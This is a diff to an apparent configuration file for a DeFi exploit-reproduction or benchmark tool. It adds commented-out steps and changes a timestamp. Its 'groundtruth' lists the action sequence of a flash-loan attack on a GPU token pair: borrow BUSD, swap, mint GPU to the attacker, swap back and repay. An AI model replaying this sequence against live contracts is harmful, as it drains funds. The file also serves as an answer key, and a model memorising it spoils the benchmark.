@@ -19,9 +19,12 @@ extra_actions:
 - 'function mint_gpu_attacker(uint256 amount) internal eurus {
   gpu.transfer(address(attacker), amount);
 }'
+# - 'function swap_owner_attacker_gpu_busd(uint256 amount, uint256 amountOut) internal eurus {
+#   gpu.transfer(address(attacker), amount);
+# }'
 
 extra_deployments:
-  - "vm.warp(1715162466 + 18 * 30 * 86400);
+  - "vm.warp(30 days);
   gpu.afterDeploy(address(router), address(pair));"
 
 extra_statements: []
@@ -32,9 +35,11 @@ groundtruth:
   - ["borrow", "busd", "owner", "22_600 ether"]
   - ["swap", "pair", "attacker", "busd", "gpu", "22_600 ether", "pair.getAmountOut(22_400 ether, address(busd))"]
   - ["mint", "gpu", "attacker", "gpu.balanceOf(address(attacker))"]
+  # - ["swap", "owner", "attacker", "gpu", "busd", "gpu.balanceOf(address(attacker))", "0"]
   - ["swap", "pair", "attacker", "gpu", "busd", "gpu.balanceOf(address(attacker))", "pair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) * 9 /10"]
   - ["payback", "busd", "owner", "(22_600 ether * 1003) / 1000"]
   
+
 # Information for search space building.
 roles:
   # "wbnb":
